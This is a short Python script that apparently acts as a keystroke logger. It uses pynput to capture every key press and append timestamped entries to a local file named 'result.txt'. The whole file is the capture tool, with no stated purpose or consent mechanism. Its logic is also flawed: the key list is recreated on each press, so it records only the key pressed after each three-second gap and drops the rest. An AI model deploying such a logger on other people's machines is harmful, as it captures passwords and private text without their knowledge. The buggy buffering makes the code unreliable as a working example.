from pynput.keyboard import Key, Listener
import logging
import time


start_time = time.time()


logging.basicConfig(
    filename='result.txt',
    filemode='a',
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    level=logging.DEBUG)


def on_press(key):
    global start_time
    list_of_symbols = []
    curr_time = time.time()
    list_of_symbols.append(str(key))

    if curr_time - start_time >= 3:
        logging.info(' '.join(list_of_symbols))

        list_of_symbols.clear()
        start_time = curr_time


def start():
    with Listener(on_press=on_press) as listener:
        listener.join()


def main():
    start()


if __name__ == '__main__':
    main()